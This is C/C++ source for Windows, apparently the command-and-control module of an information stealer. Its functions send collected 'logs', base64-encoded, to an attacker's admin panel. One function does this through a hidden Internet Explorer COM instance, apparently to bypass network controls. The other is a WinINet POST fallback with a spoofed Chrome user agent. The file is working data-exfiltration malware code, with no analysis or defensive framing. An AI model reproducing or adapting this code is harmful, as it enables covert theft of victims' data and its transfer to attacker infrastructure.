#include <windows.h>
#include <wininet.h>
#include <shlwapi.h>
#include <windns.h>
#include <stdint.h>
#include "crypt.h"
#include "fncs.h"
#include "cnc.h"
#include "mem.h"

#include <atlbase.h>
#include <activscp.h>
#include <assert.h>
#include <exdisp.h>

// ORIGINAL

HRESULT GetPostData(LPVARIANT pvPostData, LPCSTR cszPostData, SIZE_T postdata_size)
{
	HRESULT hr;
	LPSAFEARRAY psa;
	UINT cElems = postdata_size;
	LPSTR pPostData;

	if (!pvPostData)
	{
		return E_POINTER;
	}

	VariantInit(pvPostData);

	psa = SafeArrayCreateVector(VT_UI1, 0, cElems);
	if (!psa)
	{
		return E_OUTOFMEMORY;
	}

	hr = SafeArrayAccessData(psa, (LPVOID*)&pPostData);
	memcpy(pPostData, cszPostData, cElems);
	hr = SafeArrayUnaccessData(psa);

	V_VT(pvPostData) = VT_ARRAY | VT_UI1;
	V_ARRAY(pvPostData) = psa;
	return NOERROR;
}

WCHAR* combine(WCHAR* a, WCHAR* b, SIZE_T al, SIZE_T bl) {
	WCHAR* mem = (WCHAR*)_alloc(al + bl + 1);
	wnsprintfW(mem, al + bl + 1, L"%s%s", a, b);
	return mem;
}

BOOL bypassSendLogs(LPCWSTR domain, WCHAR* GetLink, LPCSTR logs, SIZE_T postdata_size) {
	BOOL ret = 0;

	if (SUCCEEDED(OleInitialize(NULL)))
	{
		IWebBrowser2*    pBrowser2;
		CoCreateInstance(CLSID_InternetExplorer, NULL, CLSCTX_LOCAL_SERVER,
			IID_IWebBrowser2, (void**)&pBrowser2);

		if (pBrowser2)
		{
			VARIANT vEmpty;
			VariantInit(&vEmpty);

			WCHAR* domain_mem = combine((WCHAR*)domain, GetLink, lstrlenW(domain), lstrlenW(GetLink));
			BSTR bstrURL = SysAllocString(domain_mem);

			VARIANT vHeaders;
			VARIANT vPost;
			V_VT(&vHeaders) = VT_BSTR;
			V_BSTR(&vHeaders) = SysAllocString(L"Content-Type: application/x-www-form-urlencoded\r\nContent-Encoding: UTF-8\r\n");
			
			SIZE_T outsize;
			LPCSTR param = base64Encode((LPBYTE)logs, postdata_size, &outsize);
			CHAR* szReq = (CHAR*)_alloc(outsize + 6);
			wnsprintfA(szReq, outsize + 6, "logs=%s", param);

			if (GetPostData(&vPost, szReq, outsize + 5) == NOERROR) {
				HRESULT hr = pBrowser2->Navigate(bstrURL, &vEmpty, &vEmpty, &vPost, &vHeaders);
				if (SUCCEEDED(hr))
				{
					pBrowser2->put_Visible(VARIANT_FALSE);
					ret = 1;
				}
				else
				{
					pBrowser2->Quit();
				}
			}

			SysFreeString(bstrURL);
			_free(domain_mem);
			_free((void*)param);
			_free((void*)szReq);
			pBrowser2->Release();
		}

		OleUninitialize();
	}
	return ret;
}

void sendLogsToCNC(WCHAR* GetLink, CHAR* base64Logs, SIZE_T logsSize) {
	LPCWSTR actual_domain = ADMIN_PANEL;

	if (!bypassSendLogs(actual_domain, GetLink, base64Logs, logsSize)) {
		SIZE_T outsize;
		LPCSTR param = base64Encode((LPBYTE)base64Logs, logsSize, &outsize);

		CHAR* szReq = (CHAR*)_alloc(outsize + 6);
		wnsprintfA(szReq, outsize + 6, "logs=%s", param);

		HINTERNET hIntSession = InternetOpenW(L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);

		HINTERNET hHttpSession = InternetConnectW(hIntSession, actual_domain, 80, 0, 0, INTERNET_SERVICE_HTTP, 0, NULL);

		HINTERNET hHttpRequest = HttpOpenRequestW(
			hHttpSession,
			L"POST",
			GetLink,
			0, 0, 0, INTERNET_FLAG_RELOAD, 0);

		const WCHAR* szHeaders = L"Content-Type: application/x-www-form-urlencoded";
		if (!HttpSendRequestW(hHttpRequest, szHeaders, lstrlenW(szHeaders), (CHAR*)szReq, lstrlenA(szReq))) {
			return;
		}

		InternetCloseHandle(hHttpRequest);
		InternetCloseHandle(hHttpSession);
		InternetCloseHandle(hIntSession);
		_free((CHAR*)param);
	}
}